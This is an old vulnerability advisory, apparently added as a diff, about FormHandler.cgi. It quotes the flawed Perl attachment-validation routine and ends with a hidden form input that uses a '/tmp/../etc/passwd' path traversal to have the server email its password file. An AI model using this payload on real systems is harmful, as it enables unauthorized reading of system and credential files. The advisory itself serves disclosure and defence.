@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/799/info
+
+Any file that the FormHandler.cgi has read access to (the cgi is typically run as user 'nobody' on Unix systems) can be specified as an attachment in a reply email. This could allow an attacker to gain access to sensitive files such as /etc/passwd simply by modifying the form document. 
+
+@ALLOWED_ATTACH_DIRS = ('all'); # hmm, nice defaults ;)
+@RESTRICTED_ATTACH_DIRS = ('/etc/');
+[...]
+
+if (&valid_directory($filename)) { # let's check if file is allowed
+push(@files, $filename); [...] } # to send
+[...]
+
+sub valid_directory {
+local ($filename) = $_[0];
+local ($allowed_path, $restricted_path);
+local($valid_dir) = 0;
+if ($ALLOWED_ATTACH_DIRS[0] =~ /^all$/i) { $valid_dir = 1 }
+else {
+foreach $allowed_path (@ALLOWED_ATTACH_DIRS) {
+$valid_dir = ($filename =~ /^$allowed_path/); # silly ...
+last if $valid_dir;
+}
+}
+foreach $restricted_path (@RESTRICTED_ATTACH_DIRS) {
+$valid_dir = ($filename !~ /^$restricted_path/); # once more
+last if !$valid_dir;
+}
+return $valid_dir;
+}
+[...]
+
+How to d/l /etc/passwd ? Just add this to the form:
+<INPUT TYPE="hidden" NAME="reply_message_attach"
+VALUE="text:/tmp/../etc/passwd"> 
